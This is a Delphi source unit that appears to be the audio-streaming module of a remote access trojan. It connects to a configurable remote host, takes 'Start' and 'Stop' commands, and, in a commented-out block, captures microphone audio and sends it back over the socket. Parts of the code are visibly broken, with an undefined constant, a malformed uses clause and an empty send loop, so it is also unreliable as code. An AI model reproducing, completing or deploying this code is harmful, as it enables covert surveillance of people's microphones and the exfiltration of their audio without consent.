unit UnitAudioStreaming;

interface
uses windows,MagicApiHooks,Classes,winsock, ;

  type
  TInfo = Record
    Name        :String;
    Host        :String;
    Port        :Integer;
    Size        :Integer;
    FileSize    :Cardinal;
    Mutex       :Integer;
    SShot:extended;
    sFile:string;
    sScreenshotStringz:string;
  End;
  PInfo = ^TInfo;



type
  TAudioStreaming = class
  private
    sIDs:cardinal;
  public
    sActive :Boolean;
    procedure WriteData(sStr:string);
    procedure TerminateIt;
    procedure StartThread(p:pointer);
  end;
var
  Audio: TAudioStreaming;
  Cmdbuffer:Tmemorystream;
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;
  BytesRead     :Cardinal;
  Buf           :Array[0..4000] Of Char;
  Host          :String;
  Port          :Integer;
  T             :String;
  Mutex         :integer;

implementation
Function RemoveIt(sStr:string):string;
var
  hStr:string;
begin
  hstr := sstr;
  repeat
    delete(hStr,pos(#0,hStr),1);
  until pos(#0,hStr) = 0;
  result := hstr;
end;
procedure doFoo(const a: Array  of Byte; out  s: String);
begin
  setLength(s, length(a));
  if length(a) > 0 then
  begin
    move(a[0], s[1], length(a));
  end;
end;


procedure TAudioStreaming.StartThread(p:pointer);
Var
  ccs:extended;
  x,y:integer;
  sBitmap:TBitmap;
  pf:tmemorystream;
  qual:Integer;
  sTempStr,data:string;
  len:integer;
  result : cardinal;
Begin
  Mutex := pinfo(p)^.Mutex;
  Host := pInfo(P)^.Host;
  Port := pInfo(P)^.Port;

  pf := TMemoryStream.Create;
  WSAStartUp($0101, WSA);
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(port);
  Addr.sin_addr.S_addr := inet_Addr(pchar(Host));
  Result := (connect(Sock, Addr, SizeOf(Addr)));
  if Result = SOCKET_ERROR Then Exit;
  T := IntToStr(C_SCREENN) + '|' + IntToStr(mutex) + '|' + #10;
    send(sock, t[1],length(T),0);
    {$I-}
    repeat
    Len := Recv(sock, Buf, SizeOf(Buf), 0);
    If (Len <= 0) Then Break;
    Data := String(Buf);
    ZeroMemory(@Buf, SizeOf(Buf));
    if copy(data,1,4) = 'Stop' then begin
    writeln('DURDU');
    end;
    if copy(data,1,5) = 'Start' then begin
    writeln('basla');

      pf.Clear;

      T := '130'+inttostr(pf.Size) + '|';
      send(sock, t[1],length(T),0);
      {$I-}
      //sleep(10);
      pf.Position := 0;
      Repeat
      bytesread := pf.Read(Buf, SizeOf(Buf));
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
      Until BytesRead = 0;
    end;
  until 1 = 3;
    pf.Free;
    {$I+}

end;

procedure TAudioStreaming.TerminateIt;
var
  p:cardinal;
begin

end;


procedure TAudioStreaming.WriteData(sStr:string);
begin
  if cmdbuffer = nil then exit;
  cmdbuffer.Clear;
  cmdbuffer.Write(sStr[1],length(sStr));
end;
end.

{
    if copy(data,1,4) = 'Stop' then
    begin
        DELETE(Data,1,5);
        ACMC.Active := False;
        ACMI.Close;
        ACMI.Free;
        ACMC.Free;
    END;

    if copy(data,1,5) = 'Start' then
    begin
      Delete(Data,1,6);
//0 2 4800 192000 4 16 0
      Format.wFormatTag := StrToInt(Split(Data,'|',1));
      Format.nChannels := StrToInt(Split(Data,'|',2));
      Format.nSamplesPerSec := StrToInt(Split(Data,'|',3));
      Format.nAvgBytesPerSec := StrToInt(Split(Data,'|',4));
      Format.nBlockAlign := StrToInt(Split(Data,'|',5));
      Format.wBitsPerSample := StrToInt(Split(Data,'|',6));
      Format.cbSize := StrToInt(Split(Data,'|',7));
      Audio := TAudio.Create;
      SesDoldu := False;
      SesBilgisi := '';
      ACMC := TACMConvertor.Create;
      ACMI := TACMIn.Create;
      ACMI.OnBufferFull := Audio.BufferFull;
      ACMI.BufferSize := ACMC.InputBufferSize;
      ACMC.FormatIn.Format.nChannels := Format.nChannels;
      ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
      ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
      ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
      ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;
      ACMC.InputBufferSize := ACMC.FormatIn.Format.nAvgBytesPerSec;
      ACMI.BufferSize := ACMC.InputBufferSize;
      ACMC.Active := True;
      ACMI.Open(ACMC.FormatIn);
  END;

   IF SesDoldu=TRUe then
    BEGIN
      SesDoldu := FALSE;
      pf.Clear;
      T := '130'+inttostr(pf.Size) + '|';
      send(sock, t[1],length(T),0);
      {$I-
      pf.Write(SesBilgisi,Length(SesBilgisi));
      pf.Position := 0;
      Repeat
      bytesread := pf.Read(Buf, SizeOf(Buf));
      If (BytesRead = 0) Then Break;
      Send(Sock, Buf[0], SizeOf(Buf), 0);
      FillChar(Buf, SizeOf(Buf), 0);
      Recv(Sock, Buf, SizeOf(Buf), 0);
      Until BytesRead = 0;
      {$I+
      SesBilgisi:='';
      pf.Clear;
    end;
until 1 = 3;
End;

{ Audio Capture End}

}
